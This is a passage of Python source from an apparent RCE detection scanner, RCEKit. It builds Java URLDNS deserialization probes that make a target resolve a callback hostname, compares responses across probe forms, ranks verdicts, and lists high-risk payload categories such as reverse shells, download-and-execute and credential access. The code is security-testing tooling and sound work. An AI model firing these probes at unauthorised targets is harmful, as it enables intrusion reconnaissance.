        b"\x4c\x00\x03ref\x71\x00\x7e\x00\x03"
        b"\x78\x70"
    )

    @staticmethod
    def _java_string(text: str) -> bytes:
        raw = text.encode("utf-8")
        return b"\x74" + struct.pack(">H", len(raw)) + raw

    @classmethod
    def java_urldns(cls, host: str) -> bytes:
        """A URLDNS stream for ``host``: a ``HashMap`` holding one ``java.net.URL``.

        Non-executing by construction, and that is the whole point. On
        deserialization ``HashMap.readObject`` hashes its key, ``URL.hashCode``
        asks the stream handler for the host address, and the JVM resolves the
        name. No class outside ``java.util``/``java.net`` is referenced, so
        there is no gadget here and nothing to run -- the callback proves the
        object graph was reconstructed, which is exactly the claim this method
        makes and no more.

        ``hashCode`` is written as -1 so the reader must compute it; a cached
        value would mean the lookup never happens."""
        return (cls._JAVA_HASHMAP + cls._JAVA_URL_DESC
                + b"\xff\xff\xff\xff"           # hashCode = -1 (not yet computed)
                + b"\xff\xff\xff\xff"           # port = -1
                + cls._java_string(host)          # authority
                + cls._java_string("/")           # file
                + cls._java_string(host)          # host
                + cls._java_string("http")        # protocol
                + b"\x70"                         # ref = null
                + b"\x78"                         # end of the URL's fields
                + cls._java_string("rk")          # the map value
                + b"\x78")                        # end of the HashMap's block data

    # --- probe construction -------------------------------------------------

    def applicable(self, record: "PayloadRecord") -> bool:
        # The payload is a serialized object, not a shell command or an
        # expression, so the break-out contexts have nothing to break out of.
        # It rides the raw context and the transport contexts, exactly as
        # `write` does and for the same reason.
        if not (getattr(self.gen, "deser_probes", None) or {}):
            return False
        return (record.context == "raw"
                or record.context in self.gen.transport_contexts)

    def _ecosystems(self) -> List[Tuple[str, Dict[str, Any]]]:
        """The ecosystems to probe, honouring ``--deser-formats``.

        An unknown name is refused rather than dropped: narrowing a run to
        nothing because of a typo would report a clean negative from a run that
        probed no format at all."""
        wanted = self.config.get("deser_formats")
        declared = getattr(self.gen, "deser_probes", None) or {}
        if not wanted:
            return list(declared.items())
        unknown = [name for name in wanted if name not in declared]
        if unknown:
            raise ValueError(f"unknown deserialization format(s): {', '.join(unknown)}; "
                             f"choose from auto, {', '.join(sorted(declared))}")
        return [(name, declared[name]) for name in wanted]

    def builds_callback_probes(self) -> bool:
        """Only when a selected ecosystem actually ships a DNS gadget.

        Three of the five -- ``php``, ``dotnet``, ``python_pickle`` -- have no
        ``dns`` entry, so ``--deser-formats php`` builds no callback probe with
        the best-delegated domain in the world. Answering from the class made
        the stranded notice blame the address for that and prescribe a domain,
        which could not have helped, and made the listener gate start a
        listener nothing would ever reach."""
        try:
            ecosystems = self._ecosystems()
        except ValueError:
            # An unknown format name is the run's own error, raised where the
            # run reports it. Assume a callback rather than pre-empt that with
            # a different message from a different place.
            return True
        return any(spec.get("dns") for _, spec in ecosystems)

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        probes: List[Probe] = []
        listener = self.config.get("oob_listener")
        host = str(self.config.get("oob_host") or "").strip().rstrip(".")
        # A gadget carries its token as a DNS label and has nowhere else to put
        # one, so an address literal leaves `<token>.10.0.0.9` -- a name that
        # resolves nowhere. The probes were built and sent anyway: real
        # requests the target answered, from which no callback could follow by
        # construction. `lookup` already refuses an address for this reason;
        # treating the host as absent here sends the shape oracle alone, which
        # is exactly what this method can still prove without a listener.
        if host and OobCallback._is_ip_literal(host):
            host = ""
        for name, spec in self._ecosystems():
            magic = str(spec.get("magic") or "")
            wellformed = str(spec.get("wellformed") or "")
            if not wellformed:
                continue
            # Same magic bytes, same length, random tail: an endpoint that
            # merely stores the value cannot tell this from the real thing,
            # while a parser rejects it where it rejects the truncated form.
            # One noise body, sent twice. The bracket below asks whether the
            # endpoint answered the same probe the same way, so the two have to
            # be the same probe -- byte for byte, not merely alike. Anything
            # the target can see a difference in, it may answer a difference
            # to: a tail beginning `n` made fastjson say "error parse new"
            # where every other tail said "syntax error", and a parser that
            # quotes the offending token in its diagnostic would differ on any
            # varying suffix at all.
            #
            # The engine de-duplicates by payload on the per-probe path, which
            # is what makes this look impossible. The aggregate path -- where
            # `deser` lives -- does not: it fires every entry of the batch.
            # Measured, not assumed; `test_identical_aggregate_probes_are_both_delivered`
            # pins it, because the bracket silently becomes one request if that
            # ever changes.
            noise = magic + "".join(
                rng.choice(string.ascii_letters + string.digits)
                for _ in range(max(1, len(wellformed) - len(magic))))

            # Two noise forms, and they go first and last so they bracket the
            # structured pair. The differential is read across requests, so
            # anything that changes with the request *index* rather than with
            # the payload lands on whichever form is sent last -- and noise was
            # always sent last. An endpoint that begins throttling partway
            # through answers 200, 200, 429 and satisfies the noise route
            # without having looked at a single payload.
            #
            # These two are the same probe: the magic followed by a random tail,
            # which no parser can read. So an endpoint that held still must answer
            # them alike, and one that did not is an endpoint whose answers cannot
            # be compared across requests at all.
            #
            # Bracketing rather than repeating every form: it costs one request
            # per ecosystem instead of four, and drift anywhere between the two
            # ends shows up in the pair. A transient that starts and ends
            # between them is not caught, which is the honest limit of any
            # bracket.
            for form, body in (("noise", noise),
                               ("wellformed", wellformed),
                               ("truncated", str(spec.get("truncated") or "")),
                               ("noise_again", noise)):
                if not body:
                    continue
                probes.append(Probe(payload=self._wrap_context(record, body), expected="",
                                    carrier=name, phase="shape/" + form))
            gadget = spec.get("dns")
            if not gadget or not host:
                continue
            token = "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
                                   for _ in range(10))
            callback = token + "." + host
            if gadget == "java_urldns":
                body = base64.b64encode(self.java_urldns(callback)).decode()
            else:
                body = str(gadget).replace("{host}", callback)
            # This one makes the target resolve a name -- the very thing `oob`
            # and `lookup` are refused for at `safe`, and its only gate was
            # `--oob-host`. Holding it back would send fewer probes at the
            # default tier, so it goes and the run says it went: a resolution
            # is a request the target makes and nothing more, which is an
            # effect a notice undoes.
            probes.append(Probe(payload=self._wrap_context(record, body), expected=token,
                                carrier=name, phase="dns", reaches_past="intrusive"))
            if listener is not None:
                listener.tokens[token] = {"payload": body, "category": "detection",
                                          "context": record.context}
        return probes

    # --- verdicts -----------------------------------------------------------

    @staticmethod
    def _signature(obs: "Observation") -> Tuple[Any, ...]:
        """A response fingerprint stable across the volatile parts of a page.

        Long digit and hex runs are dropped because request ids, timestamps and
        CSRF tokens change between two otherwise identical error pages, and
        comparing them raw would make every endpoint look like it distinguishes
        the forms."""
        body = re.sub(r"[0-9a-f]{8,}", "", (obs.body or "").lower())
        body = re.sub(r"\d{4,}", "", body)
        return (obs.status, len(body) // 16, body)

    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
        out: List[Tuple[Probe, Verdict]] = []
        by_carrier: Dict[str, Dict[str, Tuple[Probe, Observation]]] = {}
        dns_probes: List[Tuple[Probe, Observation]] = []
        for probe, obs in series:
            if probe.phase == "dns":
                dns_probes.append((probe, obs))
            elif probe.phase and probe.phase.startswith("shape/"):
                by_carrier.setdefault(probe.carrier or "?", {})[
                    probe.phase.split("/", 1)[1]] = (probe, obs)
        for carrier in sorted(by_carrier):
            out.append(self._shape_verdict(carrier, by_carrier[carrier]))
        out.extend(self._dns_verdicts(dns_probes))
        return out or None

    def _reflects_its_input(self, carrier, forms) -> bool:
        """Whether the endpoint carries the probe back into its own response.

        The shape differential reads three answers and asks what distinguishes
        them. On an endpoint that echoes the input -- a fixed-length preview, a
        "you sent:" error, a debug envelope -- what distinguishes them is the
        input, and the oracle would be reading its own payloads back as though
        the target had said something.

        The structured forms and the noise alone cannot rule this out, and that
        is not a gap in the comparison but a property of it: the original route covers every
        case where the well-formed and truncated answers differ, so the only
        region left is where they agree, and there the single remaining
        comparison is the well-formed answer against noise. Any rule reaching
        into that region collapses the pair to ``wellformed != noise``. A
        fourth input is needed, and this is it.

        What separates the two is *which* part of the probe comes back. An echo
        returns a contiguous run from the start of the payload, structural
        characters included. A parser that resolves the type name returns the
        name and not the syntax around it: measured on fastjson 1.2.83, the
        error body carries ``java.lang.String`` and never ``{"@type":"``.

        The sentinel is the format's magic, which every form carries by
        construction, so an echo reaching that far is caught whatever it echoed.

        Matched with case folded as well as raw, because :meth:`_signature`
        lowercases the bodies before comparing them. An endpoint that lowercases
        what it echoes therefore answers the structured pair alike -- which is
        what sends the noise route looking -- while a case-sensitive search for
        `rO0AB` in `ro0abx` finds nothing. The two halves of one oracle have to
        fold case the same way or the guard is blind exactly where the route
        fires. The raw search stays as well, and runs first: it is the one that
        peels base64 and hex, and base64 does not survive lowercasing."""
        spec = (getattr(self.gen, "deser_probes", None) or {}).get(carrier) or {}
        magic = str(spec.get("magic") or "")
        if not magic:
            return False
        for probe, obs in forms.values():
            body, control = obs.body or "", obs.control_body or ""
            low_body, low_control = body.lower(), control.lower()
            for sentinel in self._reflection_sentinels(magic, probe.payload or ""):
                if sentinel and (sentinel.lower() in low_body
                                 and sentinel.lower() not in low_control):
                    return True
                # Differenced against the payload-free control, like every
                # other oracle here. A sentinel the control carries too is one
                # the probe cannot have put there -- a build id, a script tag,
                # any four characters of ordinary page content that happen to
                # spell a short magic such as pickle's `gASV`. Reading the
                # probe's response alone called that reflection and threw the
                # carrier away, which is the one mistake this whole tool is
                # built to avoid, made by the guard against it.
                if (sentinel and self._search(sentinel, body)
                        and not self._search(sentinel, control)):
                    return True
        return False

    def _magic_forms(self, magic: str) -> List[str]:
        """The magic as it can appear on the wire: itself, and its escaping under
        every rule a context declares.

        A probe is escaped for its serialization context before it goes out, and
        two of the five shipped magics are made of characters escaping moves --
        fastjson's ``{"@type":`` leaves as ``{\\"@type\\":`` inside a JSON body,
        which is the most ordinary way that ecosystem is delivered at all. So the
        magic the corpus declares is not necessarily a run of the payload, and
        anchoring on it alone finds nothing exactly where this method is most
        used.

        Read from ``contexts`` rather than from a list of rule names, so a
        context added later is covered by having been declared."""
        forms = [magic]
        seen = {magic}
        # Read defensively, as `_shape_verdict` reads `deser_probes`. A generator
        # that declares no contexts leaves the bare magic, which is what this
        # method did for every payload before; an AttributeError here would take
        # the guard down and report the echo it exists to catch.
        contexts = getattr(self.gen, "contexts", None) or {}
        for ctx in contexts.values():
            rule = str(ctx.get("escape", "none") or "none")
            if rule == "none":
                continue
            try:
                escaped = self.gen._escape_for_context(magic, rule)
            except Exception:
                # A rule that cannot render this magic contributes no form. It
                # must not take the whole guard down with it.
                continue
            if escaped and escaped not in seen:
                seen.add(escaped)
                forms.append(escaped)
        return forms

    def _reflection_sentinels(self, magic: str, payload: str) -> List[str]:
        """What an echo of this payload would put in the response, in each
        wrapping an endpoint might apply on the way out.

        The general encoded search cannot carry this one. ``_encoded_search``
        only decodes base64 runs of 16 characters or more and hex runs of 16,
        which is the right floor when the thing being looked for is a short
        decimal and a spurious decode could match it by accident. These
        sentinels are structural strings the payload begins with -- ``rO0AB``,
        ``{"@type":`` -- and they encode shorter than that floor: a six-byte
        Java sentinel is eight base64 characters, and fastjson's sixteen are
        fourteen once the ``==`` padding is discounted. So an endpoint that
        base64-wraps a short echo slipped past the guard entirely.

        Encoding what is being looked for, rather than decoding the body,
        because that needs no threshold at all. Base64 maps three bytes to four
        characters, so the encoding of a prefix is a prefix of the encoding only
        where that prefix lands on a three-byte boundary -- hence the rounding.
        Hex has no such alignment, so the whole slice goes in, in both cases a
        body might spell it.

        A spurious decode cannot answer for one of these the way it could for a
        bare number: a body would have to contain the exact encoding of the
        format's own magic bytes, which is the thing being tested for.

        The sentinels are anchored on the magic's position in the payload, not
        on the payload's start. A probe is wrapped for its injection context
        before it goes out, and some wrappers are longer than the magic: an
        `xml_cdata` pickle probe begins ``<![CDATA[gASV``, so a slice taken from
        the front captures ``<![CD`` and never reaches the format bytes at all.
        A sentinel made of the wrapper is a sentinel every echoing endpoint
        matches while echoing less than the magic.

        What is anchored on is the magic *as the payload carries it*, which is
        not always the magic the corpus declares -- see :meth:`_magic_forms`. A
        JSON, XML, YAML or GraphQL context escapes it, and treating that as "no
        run to anchor on" dropped every sentinel below for the bare magic alone,
        undoing the base64 reasoning above in the one context this method is most
        often used in. A raw escaped echo did still come back, but only because
        ``_encoded_search`` happens to try ``unicode_escape``; that decode is one
        level deep, so a base64-wrapped escaped echo decoded to still-escaped
        text and matched nothing.

        The encoded forms still start at the payload's *first* byte, because
        that is where an endpoint encoding what it echoed starts, and a prefix
        of the encoding is only a prefix if it begins where the encoding does.
        They run up to the first three-byte boundary at or past the end of the
        magic, so they always carry it: rounding down instead would hand back a
        sentinel proving only that the wrapper came back."""
        sentinels = [magic]
        form, start = magic, -1
        for candidate in self._magic_forms(magic):
            start = payload.find(candidate)
            if start >= 0:
                form = candidate
                break
        if start < 0:
            # The wrapper encoded or split the magic, so there is no run of the
            # payload to anchor on. The bare magic above is what remains, and
            # the control differential is what keeps it honest.
            return sentinels
        if form != magic:
            # The context escaped it. The escaped form is a sentinel in its own
            # right: an echo comes back carrying what went out, and matching that
            # directly is what makes a raw escaped echo recognised rather than
            # left to whichever decode `_encoded_search` happens to attempt.
            sentinels.append(form)
        through = payload[:start + len(form) + 1]
        sentinels.append(through[start:])
        raw = payload.encode()
        # Hex first, because it has no alignment to satisfy: two characters per
        # byte, so the encoding of any prefix is a prefix of the encoding. It
        # therefore reaches an echo of exactly the magic, which base64 below
        # cannot.
        for text in (payload[:start + len(form)], through):
            hexed = text.encode().hex()
            sentinels.extend((hexed, hexed.upper()))
        # Aligned on *bytes*, which is what base64 encodes. Rounding the
        # character count instead agrees with the byte count only while the
        # magic is ASCII -- true of every ecosystem the shipped corpus
        # declares, and not something a `--template-file` has to honour. A
        # magic of `éAB` is three characters and four bytes, and the
        # character-aligned sentinel is not a prefix of the encoded echo at all.
        # base64 cannot do the same, and the reason is worth stating rather than
        # working around. It maps three bytes to four characters, so a prefix's
        # encoding is a prefix of the encoding only on a three-byte boundary.
        # Rounding down to reach an echo of exactly the magic would build the
        # sentinel from fewer bytes than the magic -- a sentinel a wrapper-only
        # echo matches, which is the false positive this anchoring exists to
        # remove. So it rounds up, and a base64-wrapped echo is recognised from
        # the first boundary at or past the magic's end and not before. Clamped
        # to the payload, which has nothing longer to be a prefix of.
        need = len(payload[:start + len(form)].encode())
        aligned = min(-(-need // 3) * 3, len(raw))
        if aligned >= need > 0:
            sentinels.append(base64.b64encode(raw[:aligned]).decode())
        return sentinels

    def _shape_verdict(self, carrier, forms):
        anchor = (forms.get("wellformed") or next(iter(forms.values())))[0]
        if len(forms) < len(self.SHAPE_FORMS):
            return anchor, Verdict("inconclusive",
                                   carrier + ": the shape differential needs every form "
                                   "and did not get them")
        if any(obs.status is None for _probe, obs in forms.values()):
            return anchor, Verdict("error",
                                   carrier + ": a shape probe never reached the target")
        spec = (getattr(self.gen, "deser_probes", None) or {}).get(carrier) or {}
        if not str(spec.get("magic") or ""):
            # Without a magic there is no reflection sentinel, so an endpoint
            # that echoes its input cannot be told from one that parses it --
            # and the differential answers anyway, because the noise form is
            # random and a structured pair is not. The shipped corpus declares
            # one for every format; a `--template-file` need not, and the
            # honest answer to a control that cannot be validated is to say so
            # rather than to read it.
            return anchor, Verdict(
                "inconclusive",
                carrier + ": the format declares no magic bytes, so nothing distinguishes an "
                "endpoint that parses this from one that hands the input back -- the shape "
                "differential has no control to rest on")
        if self._reflects_its_input(carrier, forms):
            return anchor, Verdict(
                "inconclusive",
                carrier + ": the response carries the probe back, so the forms differ "
                "because the input did and not because anything parsed it -- the shape channel "
                "cannot answer here")
        signatures = {form: self._signature(obs) for form, (_p, obs) in forms.items()}
        if signatures["noise"] != signatures["noise_again"]:
            return anchor, Verdict(
                "inconclusive",
                carrier + ": the same unreadable probe, sent at either end of the batch, came "
                "back two different ways -- the endpoint did not hold still across these "
                "requests, so a differential read across them is reading the drift")
        well, trunc, noise = (signatures["wellformed"], signatures["truncated"],
                              signatures["noise"])
        if well != trunc and well != noise:
            return anchor, Verdict(
                "needs-review",
                carrier + ": the endpoint answers a well-formed object stream differently from "
                "both a truncated one and the format's magic bytes plus noise, which is what a "
                "parser looks like -- a fingerprint, NOT proof of deserialization and not RCE")
        # A second route was tried here, reading noise as the control rather
        # than the well-formed stream, so that a format resolving its type name
        # before the parse finishes -- fastjson answers a truncated stream
        # exactly as it answers a complete one -- would still register. It was
        # withdrawn. "Noise differs from the structured pair" turned out to
        # have too many explanations that are not a parser: drift landing on
        # whichever form went last, an endpoint echoing a prefix of its input,
        # and a filter refusing the random payload while letting the structured
        # ones through, which no repetition exposes because the refusal is
        # stable. The guards above close the first two. The third is invisible
        # from here: refusal is judged against the probe this verdict is
        # anchored to, and that is the well-formed one.
        #
        # So the oracle keeps the comparison it can defend. A format of that
        # shape is reported `negative` by the shape differential and reaches
        # `deserialization-sink` through the DNS gadget instead, which is this
        # method's real oracle and rests on a callback rather than on a
        # response's shape.
        if well == trunc == noise:
            alike = "every form alike"
        elif well == trunc:
            alike = "a truncated stream as it answers a complete one"
        else:
            alike = "the noise form as it answers a structured one"
        return anchor, Verdict(
            "negative",
            carrier + ": the endpoint answers " + alike + ", so nothing here parses the format")

    def _dns_verdicts(self, dns_probes):
        import time
        out: List[Tuple[Probe, Verdict]] = []
        if not dns_probes:
            return out
        listener = self.config.get("oob_listener")
        if listener is None:
            for probe, _obs in dns_probes:
                out.append((probe, Verdict(
                    "inconclusive",
                    probe.carrier + ": the DNS gadget was sent but no listener was running, so "
                    "no callback could be observed")))
            return out
        wait = float(self.config.get("oob_wait", 6.0))
        deadline = time.time() + wait
        wanted = {probe.expected for probe, _ in dns_probes}
        while time.time() < deadline:
            if wanted <= {hit.get("token") for hit in listener.hits}:
                break
            time.sleep(0.25)
        received = {hit.get("token") for hit in listener.hits}
        for probe, _obs in dns_probes:
            if probe.expected in received:
                out.append((probe, Verdict(
                    "deserialization-sink",
                    probe.carrier + ": the target resolved " + probe.expected + ", so it "
                    "reconstructed an attacker-supplied object graph. The gadget is "
                    "non-executing by construction -- this is NOT proof of RCE, which from "
                    "here depends on classpath gadgets and is outside what RCEKit confirms")))
            else:
                out.append((probe, Verdict(
                    "negative", probe.carrier + ": no callback for " + probe.expected)))
        return out

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        # Never reached while there are probes: confirm_each always answers.
        # Kept because the engine's contract allows either, and a method that
        # fell through to a single verdict would report one row for a sweep of
        # several ecosystems.
        return Verdict("inconclusive", "no deserialization probe produced a decision")


DETECTION_METHODS = {
    ReflectedMath.name: ReflectedMath,
    FileBased.name: FileBased,
    WriteThenExecute.name: WriteThenExecute,
    ParametricTime.name: ParametricTime,
    EvalExpr.name: EvalExpr,
    OobCallback.name: OobCallback,
    LookupCallback.name: LookupCallback,
    DeserSink.name: DeserSink,
    BooleanDifferential.name: BooleanDifferential,
}

# Methods one probe of which buys an answer. Derived, so a method added later
# inherits the right answer instead of the answer that was current when
# somebody last edited a set literal.
CHEAP_DETECTION_METHODS = {name for name, cls in DETECTION_METHODS.items()
                           if not cls.costly}


# Categories whose payloads have a real-world side effect when fired at a live
# target (an outbound connection, a callback, credential access, a foothold),
# as opposed to read-only enumeration. Surfaced in the verification plan and
# held back unless the operator raises --verify-active-risk.
HIGH_RISK_CATEGORIES = {
    "reverse_shells", "download_execute", "credential_access",
    "lateral_movement", "container_escape", "cloud_metadata", "persistence",
}


def payload_refused(probe_status: Optional[int],
                    control_status: Optional[int]) -> bool:
    """Whether a filter refused the *payload*, rather than the request.

    Differential, like everything else this tool decides: the payload-free
    control got through and the probe did not, so what was refused is the
    payload. An application that answers 403 to everything -- an endpoint
    behind an auth wall, a path that does not exist for this session -- refuses
    the control too, and is not mistaken for a WAF.

    4xx only. A 5xx is as likely to be the payload *breaking* the application,
    which means it reached something, and reading that as "blocked" would hide
    the one response that says the sink is live.

    No vendor list and no block-page fingerprints: those go stale, and this
    tool has learned repeatedly that a hand-written list of names is a list
    that drifts. A status the control did not get is the whole signal."""
    if probe_status is None or control_status is None:
        return False
    return 400 <= probe_status < 500 and control_status < 400


# A response's structure, with everything the response *said* removed. Three
# regexes rather than a parser: the input is whatever a target returned, often
# malformed, and a parser that raises on it would turn an oracle into an error.
_SHAPE_COMMENT_RE = re.compile(r"<!--.*?-->", re.S)
_SHAPE_TAG_RE = re.compile(r"<([a-zA-Z][\w:.-]*)[^>]*>")
_SHAPE_MARKUP_RE = re.compile(r"<[^>]*>")
_SHAPE_WORD_RE = re.compile(r"\S+")


def _shape_tree(value: Any) -> Any:
    """A JSON document reduced to its shape: keys, nesting, container sizes and
    scalar *types*. Every scalar the document carried is dropped.

    A list keeps its length, because that is exactly the signal -- a predicate
    that selected three rows and one that selected none differ in nothing else
    once the rows themselves are gone."""
    if isinstance(value, dict):
        return {key: _shape_tree(item) for key, item in sorted(value.items())}
    if isinstance(value, list):
        # One element's shape stands for the whole list: a hundred rows of the
        # same shape say nothing a single row does not, and walking them all
        # would make the signature grow with the page.
        return ["list", len(value)] + [_shape_tree(item) for item in value[:1]]
    return type(value).__name__


def response_shape(status: Optional[int], body: str) -> Tuple[Any, ...]:
    """What a response *is*, with what it *said* taken out.

    The oracle underneath :class:`BooleanDifferential`. A boolean channel
    carries one bit, and the bit is read from whether the response changed --
    so the thing compared has to be blind to everything that changes for other
    reasons, and blind above all to the payload itself.

    Three readings, because a response is one of three things and the wrong
    reading is not a near miss:

    * **JSON** -- keys, nesting and list lengths. Every scalar is dropped, so a
      request id and a timestamp do not make two identical answers look
      different.
    * **Markup** -- the tag skeleton: element names and nesting, no attributes
      and no text. This is the reading that makes the method safe against a
      target that merely *reflects*, and it is structural rather than lucky:
      a reflected payload lands in the text between two tags, and the text
      between two tags is exactly what is thrown away. Measured against a
      reflect-only target, a length-based signature claimed a differential in
      13 of 25 runs; this one claimed none in 200.
    * **Anything else** -- one marker per whitespace-separated word, per line.
      Plain text has no structure but its layout, and a payload that carries no
      whitespace cannot change a word count by being echoed into a line.

    ``status`` is part of the shape: an endpoint that answers 200 to one
    predicate and 500 to another has answered."""
    shape: Any
    stripped = body.strip()
    if stripped[:1] in ("{", "["):
        try:
            shape = json.dumps(_shape_tree(json.loads(stripped)), sort_keys=True)
        except (ValueError, TypeError, RecursionError):
            shape = None
        if shape is not None:
            return ("json", status, shape)
    if _SHAPE_TAG_RE.search(body):
        text = _SHAPE_COMMENT_RE.sub("", body)
        text = _SHAPE_TAG_RE.sub(lambda m: "<" + m.group(1).lower() + ">", text)
        # Keep the tags and nothing between them. A closing tag survives on its
        # own -- it is structure, and dropping it would make <p>a</p><p>b</p>
        # and <p>ab</p> the same shape.
        return ("markup", status, "".join(_SHAPE_MARKUP_RE.findall(text)))
    return ("text", status,
            "\n".join(" ".join("w" for _ in _SHAPE_WORD_RE.findall(line))
                      for line in body.splitlines()))


def overall_detection_verdict(results: List[Dict[str, Any]]) -> str:
    """The one verdict that describes a whole detection run.

    Ordered by what the operator must not miss, and deliberately not by
    frequency: one ``executed`` among a hundred negatives is the finding, so it
    wins, and every weaker tier outranks ``negative`` for the same reason.

    ``error`` is reported only when *nothing* reached the target. A run that
    reached the target and found nothing is a real negative even if some probes
    errored on the way; a run where every probe failed to arrive tested nothing
    at all, and calling that ``negative`` would read as "not vulnerable".
    ``nothing-tested`` is its sibling: no probes were built, so there is not
    even a delivery to speak of. ``blocked`` is the third of that family: the
    probes were built and delivered, and a filter refused every one that
    arrived, so the sink never saw a payload. A run where some probes got
    through stays a real negative -- the sink saw those."""
    if not results:
        return "nothing-tested"
    verdicts = {result["verdict"] for result in results}
    # Ordered by what the operator must not miss. `executed` first; then the
    # proven non-execution findings, closest-to-RCE first -- a delay honoured
    # means something ran, a file written is a concrete primitive an attacker
    # can build on, an evaluator consuming a predicate is the weakest of those
    # three; then the two sinks whose remediation is a different subsystem
    # entirely. None of them ever becomes `executed`, which is reserved for
    # execution and has to stay that way to mean anything.
    #
    # `needs-review` is last, and it used to be second. The defence for second
    # was that a suspected RCE outranks a proven non-RCE in triage, and that
    # held while `time`, `boolean` and `write`'s uninterpreted file all
    # reported here. They do not any more, and the one verdict left under it is
    # `deser`'s shape fingerprint -- a suspected *deserialization*. Ranking
    # that above `deserialization-sink` puts a guess above the proof of the
    # same thing.
    #
    # So this order depends on which methods report `needs-review`. A method
    # added later that reports it for a suspected *execution* belongs higher,
    # and moving it is part of adding that method.
    #
    # Read from VERDICT_PRIORITY rather than written out here, because the text
    # report orders its sections by the same judgement and the two used to be
    # stated separately -- one as this tuple, the other as the order of print
    # statements in `main()`. They disagreed.
    for tier in VERDICT_PRIORITY:
        if tier in verdicts:
            return tier
    if verdicts == {"error"}:
        return "error"
    if "inconclusive" in verdicts:
        return "inconclusive"
    if "blocked" in verdicts and verdicts <= {"blocked", "error"}:
        # Every probe that arrived was refused, so nothing was ever put in front
        # of the sink. `negative` claims the probes reached the target, and they
        # reached a filter -- the same false clean `nothing-tested` exists to
        # prevent, one level further in. A run where *some* probes got through
        # is a real negative: the sink saw those and did nothing.
        return "blocked"
    return "negative"


# Every section the text report prints for a verdict that is NOT execution, in
# the order it prints them: (verdict, heading, what it does and does not say,
# compact rows).
#
# One table, because the order *is* the content. `deserialization-sink` and
# `lookup-sink` used to be hand-written blocks above a table holding the other
# four, and their physical position in `main()` was an ordering claim that
# nothing compared against `overall_detection_verdict`. It disagreed: a run
# reporting both `timing-sink` and `deserialization-sink` collapsed to the
# first and led the report with the second. A statement order is not data and
# cannot be checked, so the order moved here and the collapsed verdict reads it
# from the same place -- see VERDICT_PRIORITY.
#
# `compact` is the one formatting difference in the whole report, and it is two
# renderers rather than a formatting language on purpose: `deser` and `lookup`
# carry base64 object streams and JNDI URIs, which are truncated, and their
# `environment` says nothing a reader needs.
#
# EXECUTED is deliberately not in here. It is the one section that *is*
# execution: its heading takes a different shape and it closes on no sentence
# about what it fails to prove.
NON_EXECUTION_SECTIONS = (
    ("timing-sink", "TIMING SINK(S)",
     "the target honoured a delay RCEKit injected, so something on it waited. What "
     "waited is not shown -- a sandbox that implements sleep answers the same way -- "
     "so add --methods reflected for an execution proof.", False),
    ("file-write", "ARBITRARY FILE WRITE(S)",
     "the file is on the target and RCEKit read it back verbatim, so the directory is "
     "reachable but not interpreted. A real finding, and not RCE.", False),
    ("evaluation-sink", "EVALUATION SINK(S)",
     "an evaluator consumed the input and partitioned the response on it. Which "
     "evaluator is not shown: a query engine comparing two numbers produces this same "
     "differential, so it is not execution.", False),
    ("deserialization-sink", "DESERIALIZATION SINK(S)",
     "the endpoint reconstructs attacker-supplied object graphs. Reaching RCE from "
     "here depends on gadgets in the target's classpath, which is outside what RCEKit "
     "proves.", True),
    ("lookup-sink", "EXPRESSION-LOOKUP SINK(S)",
     "the sink resolved a URI RCEKit chose, so it evaluates the expressions it is "
     "given. Reaching RCE from here needs a server that answers the lookup with a "
     "loadable class; this listener answers with nothing, which is why the tier stops "
     "short of execution.", True),
    ("needs-review", "NEEDS-REVIEW candidate(s)",
     "a real signal that is not proof on its own. Review it by hand; do not report it "
     "as proven.", False),
)

# The collapsed verdict's order, stated once. `executed` heads it; the rest is
# the report's own section order, so the summary and the report cannot disagree
# about what the operator must not miss.
VERDICT_PRIORITY = (EXECUTION_TIER,) + tuple(
    verdict for verdict, _heading, _closing, _compact in NON_EXECUTION_SECTIONS)


def write_detection_json(path: str, results: List[Dict[str, Any]], target: str,
                         methods: List[str]) -> None:
    """Write a detection run to ``path`` as JSON.

    The machine-readable sibling of the ``[detect]`` text report, for callers
    that need the outcome rather than a human summary — the benchmark harness
    is the first. Scraping stdout cannot work: a probe payload may contain a
    literal newline (the newline separator is a real one, so line-oriented
    parsing splits a payload in half), and the detection path exits 0 whether it
    confirmed or came back clean."""
    counts: Dict[str, int] = {}
    for result in results:
        counts[result["verdict"]] = counts.get(result["verdict"], 0) + 1
    payload = {
        "rcekit_version": __version__,
        "target": target,
        "methods": list(methods),
        "verdict": overall_detection_verdict(results),
        "counts": counts,
        "probes": results,
    }
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, sort_keys=True)


def oob_channel_warnings(args: Any, dns_up: bool) -> List[str]:
    """Which of the OOB probe shapes can actually reach this listener.

    A DNS callback travels the real resolver hierarchy: the target's resolver
    asks the authoritative name server for ``--oob-host``, which has to *be*
    this listener. That needs the listener on port 53 and NS records delegated
    to it. On any other port the DNS probes are still sent and can never call
    back, and the startup line reported ``DNS :5335`` with no hint of it — so
    the operator read 'DNS covered' from a channel that was structurally dead.
    Most of the shapes are DNS ones, precisely because a resolver is often the
    only egress a hardened target has, which makes the silence expensive.

    An address literal for ``--oob-host`` carries ``oob``'s token in the URL
    path instead, so ``oob`` builds no DNS probes and there is nothing here to
    warn it about. What an address costs a method that has no second channel
    is a different question, asked of every run that names a host rather than
    only of one that started a listener -- see :func:`oob_address_strands`."""
    if OobCallback._is_ip_literal(str(args.oob_host).strip().rstrip(".")):
        return []
    if not dns_up:
        return ["[!] The DNS probes cannot call back: the DNS port could not be bound. "
                "Only the shapes that need no DNS are live."]
    if args.listen_dns_port != 53:
        return [f"[!] The DNS probes cannot call back on port {args.listen_dns_port}: a resolver "
                f"reaches the authority for {args.oob_host} on port 53 only. Run with "
                "--listen-dns-port 53 (needs root) and NS records delegating that domain here, "
                "or the DNS shapes are sent and silently never fire — only the shapes that need "
                "no DNS are live."]
    return []


def oob_address_strands(args: Any, methods: "Sequence[DetectionMethod]") -> List[str]:
    """Methods that an address for ``--oob-host`` leaves with nothing to send.

    ``oob`` takes either form: given an address it drops its DNS shapes and
    puts the token in a URL path instead. A method with no second channel
    cannot. ``lookup`` resolves an expression and ``deser`` reconstructs an
    object graph; both carry their token as a DNS label or not at all, so an
    address leaves ``lookup`` building nothing and ``deser`` holding its
    listener-free shape oracle alone.

    Neither is a failure the run should stop for -- ``deser`` still proves what
    it can, and the operator may have meant exactly that. It is a failure to
